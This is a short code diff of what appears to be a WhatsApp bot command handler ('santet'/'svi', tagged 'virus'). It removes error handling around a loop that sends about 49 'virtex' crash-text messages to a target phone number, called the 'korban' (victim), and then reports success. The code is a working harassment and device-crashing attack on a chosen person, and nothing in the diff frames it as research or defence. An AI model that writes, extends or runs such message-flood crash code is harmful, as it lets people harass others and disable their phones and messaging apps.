@@ -21,7 +21,6 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) =
             key: m.key
         }
     })
-    try {
         for (let i = 50; i > 1; i--) {
             if (i !== 0) await conn.sendMessage(korban, {
                 text: virtex,
@@ -29,9 +28,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) =
             }, { quoted: pickRandom([ftroli, react]) })
         }
         conn.reply(m.chat, `Sukses mengirim virtex ke @${korban.split`@`[0]}`, m, { mentions: [korban] })
-    } catch (e) {
-        console.log(e)
-    }
+
 }
 handler.help = ['santet', 'svi'].map(v => v + ' <nomor>')
 handler.tags = ['premium','virus']
